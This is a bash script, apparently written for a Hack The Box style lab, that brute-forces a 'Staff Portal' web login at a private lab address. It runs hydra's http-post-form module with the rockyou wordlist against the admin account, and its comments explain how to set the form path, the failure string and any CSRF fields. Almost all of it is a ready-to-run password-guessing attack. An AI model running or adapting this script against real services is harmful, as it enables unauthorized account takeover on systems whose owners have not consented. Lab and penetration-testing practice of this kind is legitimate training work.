#!/usr/bin/env bash
# hydra_run.sh - brute force the "Staff Portal" login with hydra.
#
# Run this from a machine that is ON the lab VPN (e.g. the HTB Pwnbox or your
# own box connected to the lab). It is NOT reachable from the Cline sandbox:
# 10.15.0.0/16 is a private lab network.
#
# Usage:
#   ./hydra_run.sh                       # uses defaults below
#   TARGET=10.15.0.238 PORT=9004 ./hydra_run.sh
#
# Prereqs:  sudo apt-get install -y hydra wordlists   # gives /usr/share/wordlists/rockyou.txt
set -u

TARGET="${TARGET:-10.15.0.238}"
PORT="${PORT:-9004}"
USER="${USER_NAME:-admin}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

# --- adjust these two to match the real portal (see README "Recon") ---------
LOGIN_PATH="/login"          # form action path, e.g. / or /login
FAIL_STRING="Invalid"        # text shown on a WRONG password, e.g. "Invalid credentials"
# If the form has extra hidden fields (e.g. csrf) add them, separated by '&':
EXTRA_FIELDS=""              # e.g. "csrf=TOKEN"  (usually NOT needed here)
# ---------------------------------------------------------------------------

if [ ! -f "$WORDLIST" ]; then
  echo "[!] wordlist not found: $WORDLIST"
  echo "    install with: sudo apt-get install -y wordlists  (rockyou at /usr/share/wordlists/rockyou.txt)"
  echo "    or pass WORDLIST=/path/to/list ./hydra_run.sh"
  exit 2
fi

FORM="username=^USER^&password=^PASS^"
[ -n "$EXTRA_FIELDS" ] && FORM="${FORM}&${EXTRA_FIELDS}"

echo "[*] target : ${TARGET}:${PORT}"
echo "[*] user   : ${USER}"
echo "[*] wordlist: ${WORDLIST}"
echo "[*] form   : ${LOGIN_PATH} [${FORM}] F=${FAIL_STRING}"
echo

# hydra http-post-form syntax:  "/path:POSTBODY:F=FAILSTRING"
hydra -l "$USER" -P "$WORDLIST" \
      -s "$PORT" \
      -t 16 -f -V \
      "${TARGET}" \
      http-post-form "${LOGIN_PATH}:${FORM}:F=${FAIL_STRING}"

echo
echo "[*] Done. hydra prints a green [${PORT}][http-post-form] host: ... password: <PW> line on success."
